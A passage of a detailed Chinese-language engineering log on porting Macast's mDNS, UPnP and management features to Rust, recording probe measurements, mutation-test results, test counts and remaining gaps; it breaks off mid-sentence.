* **电池 7 支，逐支读数**（`/tmp/bat30/` 备份 + 还原 + md5 回基线 + 先证明文件真的改了；N1/N2/N4 另在真机重测）：N1 清空只答成功 → 单元 1 / **真机 4**；N2 门改成 strip → 1 + 真机 1；N3 面自己写状态变量 → 1；N4 壳把布尔转发方向反了 → **单元 0 / 真机 4**；N5 表序换到 `cast-uri` 之后 → 2；N6 那行的门升成 code-execution → 2；N7 成功文档多长一个 `removed` → 1。**N4 那一格要读对**：`src-tauri` 那 19 条一条都不红，而它不是洞 —— 那一行唯一的主张是"布尔原样到播放器"，其两端（mpv 的 `yes/no`、真机上的回声）各有见证；看到"单元 0 红"就补一条断言，补出来的只会是把 `json!(show)` 再抄一遍。
* **仍然欠的 12 行**：`set-renderer` / `toggle-protocol` / `plugin-*` / `install-*` / `plugin-file` 等插件子系统；`set-interface` 等"重新广播"那个口（写了键却不重新绑口 = 给页面一个调不动东西的控件）；`save-launch-param` 等重启语义；`app-action` 里 `quit` 可做而 `check-update` 在本壳没有对应物。**本分支从未推送 ⇒ 本轮 362 条单元与那 368 条真机读数没有任何 CI 见证过。**

**Rust 侧给应答者的聚合队列取证时量到的事**（2026-10-20，`scripts/mdns_responder_probe.py` 加 4 个 `queue` 用例；**产品代码一个字节没改**，改的是"这一格该照谁做"）：

* **为什么要量而不是读**：`respond::timing()` 已经冻过（"哪条记录属于哪一桶"），但本壳没有桶 —— `announce::serve` 拿到什么立刻发。要不要建队列，从 `_handlers/multicast_outgoing_queue.py` 读不出来：合并判据是 `send_after(新) <= send_after(最后一组)`，而两个值各自带一次 `randint(20, 120)` ⇒ **答案是概率性的**，而且那个模块恰好有 Cython 构建（§4.2 那句"包发的是编译产物，答案在字节里"在这里第二次成立）。
* 四行读数（2026-10-20 本机，`--case` 逐条可复跑）：同一个聚合问题问两次隔 10 ms → **一个**数据报（第二个问题一个字节的线都没占到）；PTR+TXT 各问一次 → **一个**数据报，且偏移落在 **502 ms**（聚合上限的 `send_before` 顺延）而不是 20-120 ms；SRV 后接 TXT → **两个**（+0.7 与 +87.5 ms）⇒ 四个桶是真的；同一个 TXT 隔 1.25 s → **两个**，第二次落在 **+1339.6 ms**（`out_delay_queue` 的 `additional_delay=1000`）。
* **奖品在最后一行**：第二问之所以进"最后一秒"那一桶，是因为 `_has_mcast_record_in_last_second` 查的是 **cache**，而 cache 里那条 TXT 是**应答者自己发出、被内核环回、又被自己收进来**的。所以参考实现的防洪不是"我记得我发过"，是"**我听见了自己**" —— 一个从不读自己答案的端口要复现这一行，只能另立一本"我刚多播过什么"的账。这与 §16 第 13 条（5353 上读者的合并、`Served::absorbed` 只数不存）是同一件事的两端：**听见自己不是卫生问题，是行为前提**。
* **判据的纪律**：这四行**不进判决语料** —— `respond::respond` 无状态，答不了"几个数据报、在第几毫秒"；把它们冻进同一份 JSONL 等于给 Rust 的 diff 一行正确答案依赖队列的记录，而那件事失败的诚实形状是一次静默跳过。所以按名字排除且**数过**：`queue` 行不是恰好 4 条，探针退出 1。顺手改掉一处自己骗人的计数 —— 那行 `wrote 21 case row(s)` 数的是收集到的用例而不是写出的行（**一个把被排除的行也算进去的数字，会让下一个读者以为过滤器坏了**）；现在写的是 `wrote 17 corpus row(s) of 21 case(s)`。
* 复跑核对过：17 行判决语料逐行不变（只 `delays_ms`/`dsts` 随机器动，那本来就不是判据），探针退出码 0，`grep -c '"queue": True' scripts/mdns_responder_probe.py` = 4。

**Rust 侧把聚合队列落地时量到的事**（2026-10-20，`macast-cast/src/aggregate.rs`（新增，22 条用例）+
`announce.rs` 的 `serve`/`run` 改写 + `respond.rs` 的 `bucket`/`datagram_multi`/`Reply.groups` +
`mdns.rs` 的 QR 位；`macast-cast` **728** 条，两台仪器一致；真机新增 §31）：

* **四行读数变成四行判据**：同一问两次隔 10 ms ⇒ **一个**数据报（合并）、两组时第一组等到
  `send_before`（实测那个 502 ms 的顺延）、SRV 后接 TXT ⇒ **两个**、隔 1.25 s 的第二问走保护队列
  ⇒ floor 是 1000 + 随机而不是 500。随机延迟**由调用方交进来**（`Outgoing::with_random`），
  时钟也是参数 —— 有 100 个值的硬币不可能是判据；生产那一份抽样的是一只**有名字的函数**
  （`production_draw`），不是 `Outgoing::new` 里那条表达式（第一版从构造函数抽 400 次要求两端都出现过，
  本机一跑就红：那是**一条概率判据**，miss 率约 4%，而一条一跑就红的用例会被删掉而不是被修好）。
* **`Ledger` 只从「听见」里学，而分派看的是 QR 位**。`_listener.py:326` 是 `if not msg.is_query()`，
  不是「问题列表是不是空」——两者只在一种包上分开：**同时带问题和记录的响应**，所以判据就是那种包
  （`a_response_that_also_carries_questions_is_ingested_and_not_answered`）。goodbye（TTL 0）是
  **忘掉**，且不在表里时什么都不做（`record_manager.py:130-135` 那个不对称），第一版把也计数了 ⇒ M7 红。
* **TTL 与 section 不是记录身份**（`_dns.py:113` + `DNSPointer._eq`/`DNSText._eq`）。这条不是洁癖：
  `datagram_multi` 的 `_add_answers_additionals` 去重要问「这条 additional 是不是本批已发的 answer」，
  而一个是 AN 一个是 AR —— 按 `Chosen` 的结构等值去重等于**从不**去重。于是 `Reply` 多了
  `groups`（哪个 additional 挂哪个 answer，队列的合并与移除按它），`records` 由它派生并由判据钉住
  `records == flatten(groups)`，两份字段一个主人。**顺手抓到一条产品 bug**：一条答复里两个问题
  （PTR + SRV）以前会各交一份 A/NSEC，`sending = set(answers)` 那一半被抑制的 SRV 也会重新上线；
  语料看不见这件事是**结构性的**（它比的是集合，且每行只问一个问题），所以判据是新写的一条
  （`two_questions_that_share_the_host_pair_cost_one_copy_of_it`，问 ANCOUNT=2 / ARCOUNT=3）。
* **电池 16 支：15 支各红 1–3 条，而 M11 第一次是 0 红——红的是我自己的设计，不是产品。**
  去重我写成了**两个集合**：一个用全部答案预置（`sending`），一个记「这一段里已经写过」（`written`）。
  把第一个删干净，全套件一字不红，因为现有用例都是「一个服务、一段」的形状，第二个把活全干了 ——
  **一条规则的两半在测试眼里是同一半**。修法不是补断言而是**删掉第二个集合**（一份 `sending`，
  先被答案灌满、随写随长，正是 `answers.py:100` 那一份），改完 M11 红 1 条。附录 B 因此多了一条
  `grep -c 'written: HashSet' macast-cast/src/respond.rs` **期望 0** 的锚。
* **一条新形状：`pkill -f <临时目录>` 杀不到我起的实例**。那些进程是
  `perl -MPOSIX -e 'setsid(); exec'` 起来的，配置目录在**环境变量**里而环境变量**不在 argv** 里，
  于是 pkill 匹配零个进程。第一次 §24 因此红 3 条（"关掉 Chromecast 的实例上 8009/8008 仍在答"），
  而 §24 的 browse 里明明白白印着我那个探针的实例名 `Macast-Hear2` —— 场上确实多了一台
  Chromecast 接收端，产品一个字没错。判据回到 §4.2 那条老话：**按 `lsof -nP -iTCP:<port>
  -sTCP:LISTEN -t` 交回的 PID 杀**，不是按模式杀。顺带按同一句话只收本次新增的两个 `ppid=1` 孤儿 mpv
  （IPC 口指向我自己那两个已删目录），HanCast 的那一个不动。
* **§31 的量到的那半**：本机在第一串广播后约 0.8 秒出现 `learned 4 record(s)` —— **4 而不是 5**，
  因为 NSEC 我们的解析器不读（§8 新增一行；判据同时断言同一包里的 TXT 确实被保护，免得那一行被读成
  「机制不生效」）。同一支探针还量到：**自己发的多播听得见，别的进程发的查询听不见**
  （单播到 `127.0.0.1:5353` 与打到组播的各试一次，`heard query` 一句都没有），于是 §25 那一格从
  "这个二进制收不到入站多播"收窄成"**收不到别人的**入站多播"；原因仍未定，不挑一个填。
* **仍未做的三件，方向别读成"做完了"**：① QU 的 ¼ TTL 那一问（`add_qu_question_response`）没有落地 ——
  它需要账本存 TTL，而本端口的 `Ledger` 故意只回答"最后一秒"这一个问题；② 因此 §16 第 23 条的
  "QU 位没有第二个消费者"**照旧成立**（翻面的只有 `Timing` 那一半）；③ §25 的送达那一格还跳着，
  所以"聚合让组播上少了一份答案"这件事在**跨机器**上没有见证者，它有的只是那四行读数、728 条单元判据
  和 §31 那句"我们听得见自己"。**以及本分支从未推送 ⇒ 这一轮的 728 条与 §31 的读数没有任何 CI 见证过。**

**Rust 侧把 QU 经组播到达的那一问补上时量到的事**（2026-10-20，`respond::Group::from_qu` +
`announce::split_by_bucket` 的第四条路 + `aggregate::Ledger` 多存一个 TTL；`macast-cast` **730** 条）：

* **上一轮的账本答不了这一问**：`_has_mcast_within_one_quarter_ttl` 走 `is_recent`
  （`_dns.py:208-210`：`created + 250 * ttl > now`，TTL 单位是**秒**），所以条目必须带 TTL；
  一带上 TTL，`prune` 就必须按**较长**的那一问老化 —— 按一秒修剪会让 `is_recent` 永远答"没有"。
  上一轮的 `prune` 是按一秒窗口老化的 —— 那在只有"最后一秒"这一问的世界里是对的，
  而加进第二问之后它变成一个**永远答"没有"的 `is_recent`**，且没有任何一条旧用例看得见
  （旧用例问的都是 `seen`）。所以这一格的判据是新写的：同一份文件里那条 4500/120 秒的对照
  ——一分钟后可广播口只剩长 TTL 的两条，那是"老化按记录自己的寿命走"唯一能被读出来的形状——
  并且 N5（把 prune 退回一秒）与 N6（`learn` 不存 TTL）各自红 1 / 2 条，
  也就是说这条陷阱确实有人看着，不是文档里的一句担心。
* **语料早就用毫秒指出过这一格，只是没人按毫秒读**：`ptr-qu` 那行答 **+0.3 ms**，同一份语料的
  `ptr` 行答 92 ms —— 那 0.3 不是噪声，是 `_mcast_now`，即"QU 经组播到达不进聚合队列"。
  第 36 条定过"延迟不作判据"，所以这里断言的仍是**桶**，毫秒只是它为什么该是这个桶的证据。
* **一条规则有两个方向，读反的那一支红了 3 条，其中一条在 e10**：recent ⇒ **只回单播**（组里一个
  字节都不许多播）；not recent ⇒ **立即多播且不回单播**。把两边换过来，外来栈那支从 5353 进来的
  QU 查询（`e10` 的第三种形状）整条被改成单播 —— 也就是说这条判据的牙不止咬住新写的三条 QU 用例。
* **第四条路不是第四个桶**：参考实现的 `_ucast` 由调用者直接写、从不进队列，所以
  `Route::{Bucket(Timing), Direct}` 必须是两个维度；而 QU 分支的前提是**源端口**
  （`if not ucast_source and is_unicast`），去掉那个前提会让临时口的查询丢掉组里那一份拷贝
  （判据把"两份都在"和端口号一起钉住，与语料 `ptr-ephemeral-src` 那一对得上）。
  单播那条腿仍走 `respond::unicast_of` 一个主人 —— 上一轮它是"临时口答复"专用的。
* **一次自己吞掉五条用例的 splice，被计数地板抓住**：我用索引切片重写测试助手时，把区间里
  五条不相关的用例一起吃掉了；`--list` 从 728 掉到 725，而 `TESTS_IN_THIS_CRATE` 的
  `>=` 判据当场红。这条值得写在这里，因为它给那个"低地板看不见漂移"的老话题补了反向的一半：
  **`>=` 看不见新增，专治删除** —— 而删除恰好是"这一格从此无人提问"最常见的发生方式。
* **一个协议数字收成一位主人**：`MDNS_PORT` 曾在 `mdns.rs` 与 `announce.rs` 各写一份
  （都是 `pub const … = 5353`）。两份字面量互相核对只会得到"它们现在一致"，而它出事的方式
  正是有人只改一份；附录 B 加了一条问**个数**的锚（期望 1，且文档里那句历史引用不算，
  因为锚问的是声明行）。**本分支从未推送 ⇒ 这 730 条与 §31 的读数没有任何 CI 见证过。**

**Rust 侧把 `set-interface` 接进管理面，并顺手量到"钉住网卡"只钉住了文档没钉住出口**（2026-10-20，
`src-tauri/src/main.rs` 的 `Discovery`（新把手，1,724 行里的这一段）+ `macast-upnp/src/http.rs` 的
POST 表第 **12** 行 + `macast-cast/src/announce.rs` 的 `send_group` / `pin_multicast_if` +
`scripts/mdns_iface_listener.py`（新增）+ 真机 §32 的 **17 条**）：

* **一张脸两个门，就必须只有一个把手**：`Runtime` 不再自己持有 `ssdp` / `cast` / `announce` /
  `airplay` 四份字段，它们搬进 `Discovery`，窗口那条 `set_network_interface` 命令与 HTTP 的
  `set-interface` 行都调**同一个** `Discovery::set_interface`。写这一段的动机不是整齐：在此之前
  POST 行不存在，而窗口命令早就在动 SSDP 与广播 —— 一个页面若能把开关写进设置文件却不动那两个
  监听器，它交回的就是「已切换到 en0」配一根还在广播旧地址的天线，也就是本轮文档里那句
  「控制项看起来能用」。审计随之改形：**"门读在每张脸之前"那一问现在只看 `run()` 的函数体**
  （helper 在文件里第一次出现不再是顺序的证据 —— 它只在门之后被调用），而"每类构造点恰好一个"
  仍按整文件数；新增两问问 `discovery_services` / `start_announcement` 这两个 helper 各自只有
  一个定义，`.restart(` 的调用点恰好两个（boot 与切换）—— 第三个调用点就是绕过门的第三张脸。
* **拒绝这一格的判据必须是磁盘，不是内存**：`_set_network_interface` 在存之前先查已知网卡表，
  而查表这一步在 Python 里走 `Setting.get(Network_Interface, '')`（`utils.py:325-334` 经
  `network_interfaces()`），那正是 §4.2 第一条陷阱 —— **默认值会被写进内存表**。所以一次拒绝之后
  `has()` 为真在两边都是对的，"拒绝之后键仍然不存在"这条断言会把下一位作者推向 `peek` 以取悦测试，
  而那才是真的偏离。本轮的判据因此是**文件字节不变**（单元与 §32 各量一次 md5），内存那半边照 Python。
  与上一轮 §24 那条"门这次读取不许造出键"看着同形，问句其实不同：那里问的是**门自己的读取**用了
  `get` 而没有 `has` 守卫（会持久化一个从未存在过的 legacy 键），这里问的是**一次被拒的写**有没有
  落盘。两句话各自有一条用例，形状相同而命题不同，这件事写进了测试的注释。
* **一条概率性断言被一支空变异体抓出来**：e11 的第一版钉的是"环回监听器在 `[127.0.0.1, <局域网口>]`
  两份拷贝里只收到 1 份"。它在干净树上绿，而在 B5 ——一支什么都不改的变异体（`egress.push(*address);`
  之后加一句 `let _ = address;`）—— 手上**红了**。红的是内核此刻愿意把经第三块卡发出的包投给哪个
  join，不是代码的性质。判据换成**把选项本身读回来**（`SockRef::multicast_if_v4()` 必须等于 egress
  列表的最后一个 —— 顺带问出"旋转"而不是"设一次"），而"包真的从那块卡出去了"这一问交给真机 §32；
  这一支空变异因此是电池的自检：**改动了零行为却改变了判决，说明该修的是判据**
  （memory「A check must be able to answer」的另一半：能红不等于问的是代码）。
* **"钉网卡"这一格是手工探针先量出来的，§32 是把它变成判据的那一节**：窗口命令接上之后先做一次真机探针（`/tmp` 里那支 sniff，未入库；入库的是 `scripts/mdns_iface_listener.py`），量到的是
  `set-interface=bridge100` 让广播日志写成 `joined 1 of 1 interface(s) [192.168.139.3]` /
  `over [192.168.139.3]`，而**加入 192.168.139.3 的监听器收到 0 个包，突发仍然在 192.168.1.5 上出现**
  —— 因为合并后的引擎只 bind+join，从不设出口，内核按路由选卡。也就是说这一格此前钉住的只有文档。
  修法是每次组播**逐出口设 `IP_MULTICAST_IF` 并发一份**（`send_group`），这正好是参考实现"一块卡一个
  socket、每串各发一份"的线上形状（§22 数到 6 个 socket），而本端口只有一个 socket。
  答案形式也量了：`sock.rs:28-36` 说 BSD 要的是**接口下标**，而这里用**地址形式**实测有效
  （探针：加 `IP_MULTICAST_IF=192.168.139.3` 的包出现在该口的监听器上，默认口那份监听器读到 0）。
  修完之后 §32 那一条读数就是 `3 datagram(s) of Macast-Rust-Iface heard on 192.168.139.3`。
* **两处单元看不见的读数，写清它们靠哪一层**：把 `ssdp_reannounced` 钉死成 `false`（A4）与
  少调一次 SSDP rebind，在单元层**0 红** —— 那台测试实例的 SSDP 本来就没起，`false` 是正确答案；
  它们唯一的牙是真机 §32 那句 `true`（与 §24 那条「门必须是真机判据，单元判据只能问读法」同一条）。
  反过来，把 `set` 那一行删掉（A2）与把 `restart` 那一行删掉（A5）各红 2 / 1 条，而**红里都包含
  那条结构审计**（`set(Key::NetworkInterface` 与 `.restart(` 的"恰好一个/两个"），也就是说这一轮
  新增的审计不是装饰：行为断言看不见"少了一个调用点"，计数看得见。
* **仪器自己的两次错，都在写脚本时现形**：① `struct.pack('4sl', group, iface)` 那个 Linux 口味在
  macOS 上让 `IP_ADD_MEMBERSHIP` 直接 `EINVAL`，监听器死在加入组那一行 —— 若我把 `hits 0` 读成
  "产品没发"，这一格就成了第二个 §25；现在它退出码 2 并打 `LISTEN_FAILED`，与"没有命中"分开说。
  ② 名字过滤必须用**线上形状**（长度前缀标签里的裸 `Macast-Rust-Iface`，没有点），而且要取**本节自己**
  那行日志里的实例名 —— 取 §22 的那个会变成一支永远返回 0 的过滤，读起来正是"包没动"（§25 那两条
  同一个针，第三次扎在同一个地方）。
* **计数**：`macast-cast` 730 → **731**（两台仪器一致：`--list` 与地板），`macast-upnp` 362 → **363**，
  `macast-tauri` 19 → **22**，POST 表 11 → **12** 行（参考实现 23 行，还差 11）；真机 **35 节
  389 PASS / 0 FAIL / 1 SKIP，退出码 1**（那一条 SKIP 仍是 responder 的送达那一格）。
  电池 15 支：A1 1 / A2 2 / A3 1 / A4 **0（真机才有牙）** / A5 1 / A6 1 / A7 1 /
  B1–B4 各 1 / B5 **0（空变异对照，先红后修判据）** / C1 1 / C2 2 / C3 1。
* **仍然欠着**：`pin_multicast_if` 在非 unix 上是**明写的行为空操作** —— Windows 这一路从未量过，
  所以那里出口仍随路由；5353 上仍是两个 socket（浏览器 + 引擎），§16 第 13 条的另一半没做；
  POST 表剩下 11 行里 9 行等插件子系统。**本分支从未推送 ⇒ 这 731 条与那 389 条读数没有任何 CI 见证过。**

**Rust 侧去合并 5353 上两只 socket 之前先量了一次"单播到底给谁"，结果这一问的前提塌了**
（2026-10-20，`scripts/mdns_unicast_bind_probe.py`（新增）；**产品代码一个字节没改**）：

* **被写成任务的那句推论，在本端口的真实形状上不成立**：§16 第 13 条量到「单播整条只交给 reuse
  group 里的一个 socket，交给谁随流变」，于是#40 被写成"浏览器与引擎合成一只，硬币就不吃了"。
  照本端口实际的样子量（两只都绑 `0.0.0.0:5353`）读数是 **A 0 / B 0** —— 送到本机地址的单播 mDNS
  报文在进**任何一只**之前就被判给了别人（这台机器上是系统 `mDNSResponder` 握着确切地址的绑定）。
  合并两只通配 socket 买到的仍是 0。**"推论"只要写成了"所以下一步怎么做"，它就会决定代码，
  而它错的时候没有任何一条用例会红** —— §16 第 13 条那句话本身就是这条规矩的产物，这次是它自己中招。
* **两条对照先过，才敢说那个 0**：绑到 `192.168.1.5` 的 socket 同一条流收满 6/6（这台机器确实投递
  5353 的单播）；joined 的通配口收满组播 6/6（第 13 条的读法在本机仍然成立）。
* **省事的修法也被第四行否掉**：一只 socket **同时**绑地址并加入组 ⇒ 组播 0 / 单播 6 —— 绑了地址就
  听不到组播，所以两个角色必须两只 socket。参考实现正是这个形状，读 `.venv` 里的包而不是读 RFC：
  `new_listen_socket`（`_utils/net.py:455-461`）只有**一只**通配 socket，docstring 自己写着
  「used to receive multicast queries」；`new_respond_socket`（`:415-455`）**一块接口一只**，
  注释写着「Bind explicitly to the interface address」。本端口只做了前者 ⇒ 会听组播、听不到单播。
* **今天咬到哪一层要写死，免得下一个人接错案**：`mdns::query` 的 class 里没有 `0x8000`，我们的浏览器
  并不设 QU，设备答复走多播，所以**设备下拉今天不受这一格影响**；受影响的是反向 —— 别人单播问我们，
  我们听不见也就不答。§25 那格 SKIP 与它**无关**（那三条查询是多播到达、另一个进程看得见），
  这一行不许被引成 §25 的答案。#40 重新定义为"各加一只绑地址的 socket，组播那只留着"，
  判据必须用**单播**打进来才算问到（发给自己本机地址即可，不必上局域网）。
  **本分支从未推送 ⇒ 这四行读数没有任何 CI 见证过。**

**Rust 侧把那只"绑到接口地址"的第二种 socket 落地时量到的事**（2026-10-20，`macast-cast/src/announce.rs` 的 `bind_unicast_listener` / `Engine::unicast` / `recv_any` + `announce_tests` 的 e12·e13 与一条装配审计 + `scripts/mdns_unicast_ask.py`（新增）+ 真机 §33 的 **8** 条；`macast-cast` 731 → **734**，整跑 **397 PASS / 0 FAIL / 1 SKIP，退出码 1**）：

* **上一轮写下的那句解释被这一轮的读数否掉了**：第 40 条说"单播在进任何一只之前就被判给了别人
  （本机上是系统 `mDNSResponder` 握着确切地址的绑定）"。前半对，后半**没问过机器** —— app 起来之前
  问同一个地址同一个口，ascker 收到的是**谁都不答**（4 秒 0 份），app 绑上之后是 **5/5 全答**。
  所以没有邻居在偷报文，通配口收不到是**目的地址匹配**的性质。§25 那一格因此再往里收一层并且不改口：
  **到得了的是别的进程发的单播，到不了的仍是组播**，那个原因这一轮还是没有名字。
* **形状**：`bind_engine` 在原来那只（通配 + join + 读）之外每个 offered 地址再绑一只，**不 join**
  （上一轮第四行量过：绑了地址就收不到组播，join 也买不回来），只进轮转；答复与突发仍从组播那只出去。
  `recv_any` 是轮转而不是 `poll(2)`（本 crate 的 `libc` 只为 socket2 到不了的那一个 `setsockopt` 存在，
  加 `WSAPoll` 分支等于加一条本仓库从未运行过的平台路径），每个 socket 分**剩余时间的均分**，
  所以总等待仍受调用方给的 `wait` 约束 —— 循环的 `wait = min(poll, reannounce, queue)`，
  轮转一旦冲过头，排好的答复就晚于它自己的 due time。
* **判据三层，缺一层就有一个形状没人问**：`e12` 行为（外来那份 40 字节的查询被轮转听见并被答，答复
  **源端口** 5353；同一条用例带**对照**：轮转只指向通配那只时 1200 ms 内不许再看见同样的字节 ——
  没有对照，"第二只在场"与"第二只承重"是同一句话）；`e13`（引擎那句总结里的地址表是从 socket
  `local_addr()` 读回来的，不是抄 offered 列表：offered 里放一张绑不上的卡，句子里就必须没有它，
  WARNING 必须带着那张卡与操作系统的原话）；一条装配审计（`start()` 的听众表必须由 `.extend(` 与
  `engine.unicast` 一起构成，轮转只有一个驱动点）。
* **这一轮最贵的一格是审计自己的第一版不提问，而且是电池抓出来的**：第一版问的是"`let mut listeners`
  那一带有没有 `unicast` 这个词"，而 U3 那支变异体（把 `listeners.extend(engine.unicast…)` 换成
  `let _ = &engine.unicast;`，也就是**绑了但从不读**）交回 **0 红** —— 替换后的那一行仍然提到
  `unicast`。判据改成问**两个名字必须同时在场**（`.extend(` 与 `engine.unicast`）之后同一支红 1 条。
  这是 §4.2「不提问的检查」在本仓库的第四次现形，也是第二次从我自己刚交的测试里挖出来的。
* **电池六支**（一支一条命令，`/private/tmp/bat40/` 备份 + `finally` 还原 + md5 回到 `3908f1a7…`，
  并且脚本在文件没变时**拒绝报告结果**）：U1 第二只改绑通配 **2 红**（e12 与 e13 —— 后者是因为句子会
  诚实印出 `0.0.0.0`）/ U2 一只都不造 **2 红** / U3 造了但不进轮转 **1 红**（修好判据之后；修之前 0 红）/
  U4 轮转只读第一只 **1 红** / U5 总结改抄 offered 列表 **1 红**（e13）/ NUL 一支**语义不动的空改动**
  **0 红** —— 那支是电池自己的对照：它要是红了，上面五个数就都在读噪声。
* **一条没再现的读数留在这里**：U5 第一趟除了 e13 还带出 4 条 `relay_tests` 红（"the latch records
  that we asked"、三处 spawn 计数翻倍），而 U5 重跑与**五趟干净整跑**都不再现。本轮不解释也不修它，
  但把它标注成"未复现"，因为"某一支变异带出四条别的红"这句话一旦进了读数栏而没人写复现与否，
  下一次就会有人拿它当连带证据 —— **没复现的读数不是读数**。
* **仪器自己的三次错，全长得像产品坏了**：① 新探针第一版按 `record.name` 判"这份答复是不是我们的"，
  而 **PTR 答复记录的 `.name` 是服务类型**、实例名在 rdata 里 —— 它对着夹具那份**正确**的答复报
  "3 份都不是我们的"；判据换成按**线上字节**找首标签（§25 那条"点号名在线从不存在"的同一条规矩）。
  ② 夹具用的 `DNSPointer(...)` 在这台机器的 Cython 构建里要 **5 个**位置参数，少一个就 TypeError，
  栈打在仪器里而产品一个字没错。③ `e12` 第一版把地址选成 `127.0.0.53`：macOS 直接拒
  （EADDRNOTAVAIL 49）而 Linux 放行 —— 那是 §4.8 Part 40 那条"判决由跑测试的那台机器决定"的形状，
  这次栽在刚写下的夹具里，现在用 `192.0.2.1`（TEST-NET-1，三平台都拒）与 published 集合里真的那块卡。
* **收尾抓到的两条仪器缺陷，都不改产品**：④ `mpv_ask` 那 6 秒是**两次 recv 之间的静默上限**而不是
  总等待 —— mpv 只要继续吐事件，那个读循环永不返回，而它占着的正是播放器那根 IPC 连接，于是后面
  每一条读都回空串，节里交出的却是**产品**红（§13 那两格"窗口名字没跟着改"就是这么来的）。判据改成
  按墙钟的总截止（8 秒，`ap_mpv_ask` 同形状一起改），`except` 也从 `socket.timeout` 放宽到
  `TimeoutError/OSError`。⑤ 更根本的一条：这台 Mac 的**屏幕锁了**（`CGSSessionScreenIsLocked=True`）
  —— 锁屏之下 shell 写的 `loadfile` 与外部探针**直接写进播放器那根 socket** 的 `loadfile` 都不被
  执行（无 `start-file`、无任何事件、进程 0.0% CPU），而第二条连接问 `get_property` 照旧答得出。
  §13/§14/§16/§21/§26/§27/§30 全都要读播放器，所以脚本现在起跑前问一次锁屏并 `exit 2`（与"端口被
  占着就拒绝跑"同一族：**测不出来的仪器不许打印判决**）。也因此，上面那个 **397** 的出处要钉清楚：
  它是这一轮**唯一一趟屏幕没锁的整跑**（05:5x）读的，之后三趟都停在锁屏上，改的是仪器而不是判据。
* **仍然欠着的三件，方向别读成"这一格结了"**：`mdns::open`（浏览器）没有第二种 socket，因为本端口的
  查询从不设 QU，第 40 条那句"设备下拉今天不受影响"仍然成立；**答复的源地址**由路由决定（§8 新增那一行
  记这条偏离，本机给不出价，需要第二台真机器）；5353 上仍是两个 socket（浏览器 + 引擎），
  §16 第 13 条的另一半没做。**以及本分支从未推送 ⇒ 这一轮的 734 条与 §33 那 8 条读数没有任何 CI 见证过。**

**Rust 侧把协议开关接进管理面时量到的事**（2026-10-20，`src-tauri/src/host.rs` 的 `set_protocol_enabled` 与 `Discovery::toggle_protocol` / `apply_protocols` / `{start,stop}_{cast,airplay}` + `macast-upnp` POST 表第 **13** 行 + 真机 §34 的 **24** 条；`macast-tauri` 22 → **25**、`macast-upnp` 363 → **364**，整跑 **421 PASS / 0 FAIL / 1 SKIP，退出码 1**）：

* **形状**：参考实现的 `_toggle_protocol`（`protocol.py:2394-2402`）用「标题不在启用表里」定方向，写侧
  `set_protocol_enabled`（`macast.py:429-453`）四条规则逐行照抄；本壳把 **boot 与开关收成同一批构造函数**
  （`Discovery::start_cast` 拥有 8009 → 8008 的顺序、证书与每句拒绝），于是"只有启动进程才能开脸"
  这条形状没了。`apply_protocols` 读一次 `faces_enabled`、按它开关、再 `restart` 广播。**DLNA 那一格
  拒绝**（§8 新增那一行）：参考实现的用户还有菜单栏，本壳的页面就住在 DLNA 的 HTTP 面上。
* **这一轮最贵的读数**：重构之后 §24 的「关掉 Chromecast 的实例上 8009/8008 仍在答」**红了 7 条**
  —— boot 那次 `discovery.start_cast()` 漏了 `if cast_on`。三条结构审计（每张脸一个构造点、`run()`
  里门在调用之前、文件级恰好两处读门）**一条都没响**：构造点没变，只是不再被 if 包住。抓到它的是
  **真机读数**（§24 那条「门必须是真机判据，单元判据只能问读法」的第一次反向现形 —— 这次不是单元
  测不到，是**审计的形状与破坏的形状不同**）。修法一行，并补一条 `apply_protocols` 的"先读门再开关"。
* **§34 自己有三条是测试的错**：① "只有幸存的协议重新广播"用绝对行数比，而 boot 已印过两条 —— 改成
  步骤前后的增量；② 那个计数器本身也错：`announcing .*_googlecast` 会命中 **AirPlay 那一行**（它的
  句子末尾拿 `_googlecast._tcp` 当宾语），与 §4.14「扫描器数到自己的文档」同一族，改成按**被公告的名字**
  匹配；③ 小写标题那格拿字节比中文，而正文是 `ensure_ascii` 的 `\uXXXX`（§9.3 那个后果的又一次）。
* **验证侧的一次事故**：§34 第一次跑被一台**我自己留在场上的冒烟实例**污染（它占着 8009/8008 并广播
  `Macast-Rust-Toggle`），于是 §24/§25/§26/§34 一起红。脚本只拒绝自己的 `ApplicationPort` 被占，
  **不拒绝 8009/8008 被别人占**（后者是每个 Macast 实例共用的固定口）—— 收尾必须按 pid 杀掉自己的
  实例（§4.2「起新实例前先杀干净」在验证侧的同一条）。
* **仍然欠着**：`set-renderer` 没移植（本壳只有一个渲染器，接受一个已在位的名字就是"只动文档的
  旋钮"）；"关掉最后一个协议"只有单元见证（活实例读内存里的表，改文件不影响它）；`app-action` 的
  `quit` 可做、`check-update` 没有对应物。**本分支从未推送 ⇒ 这些读数没有任何 CI 见证过。**

**Rust 侧把退出按钮接进管理面时量到的事**（2026-10-20，`Discovery::app_action` + `macast-upnp` POST 表第 **14** 行 + 真机 §35 的 **9** 条；`macast-upnp` 364 → **365**，整跑 **430 PASS / 0 FAIL / 1 SKIP，退出码 1**）：

* **形状是参考实现的**：`_app_action`（`protocol.py:2404-2414`）**先答复、再退出**，这里起同名
  `MACAST_QUIT` 线程、250 ms 后 `app.exit(0)`；退出钩子照旧跑 `stop_services`，所以 byebye、
  goodbye、关面、停播放器都还在。`check-update` 诚实拒绝（本构建没有更新器，答「正在检查更新」
  是让人去看一个不存在的进度条；§8 记这一行）。
* **判据里最有用的一条是"端口都空着"**：进程消失之后应用端口、8009、8008 三个都能被别人 bind
  —— 这把"退出钩子真的跑了"从一句日志变成三个可被第三方占用的口。另外两条：未知动词与
  `check-update` 都**不动进程**（`kill -0` 对着 pid 问），以及答复先到（curl 拿到了
  「Macast 正在退出」而进程随后才消失）。
* 仍然欠着：`set-renderer`（只有一个渲染器）、插件子系统那 10 行、`save-launch-param` 的重启语义。
  **本分支从未推送 ⇒ 这 365 条与 §35 那 9 条读数没有任何 CI 见证过。**

**Rust 侧把 POST 表补到齐平、并修掉一个"页面看起来是过期资产"的假象时量到的事**（2026-10-20，
`macast-upnp/src/http.rs` 的第 **23** 行 `mirror-action` + `MIRROR_ABSENT_MESSAGE` +
`ShellManagement::mirror_action` + `frontend/index.html` 的重建 + `src-tauri/src/host.rs` 的两条静态守卫 +
真机 §39 的 **8** 条；`macast-upnp` 367 → **369**、`macast-tauri` 26 → **33**）：

* **上一轮那条待办读错了，而错的方式比缺陷本身更值钱。** 它记的是"嵌进窗口的那份页面不是当前的"，
  于是下一件事被写成"用 Web Inspector 与 console 二选一先定性资产"。**资产是当前的**：把
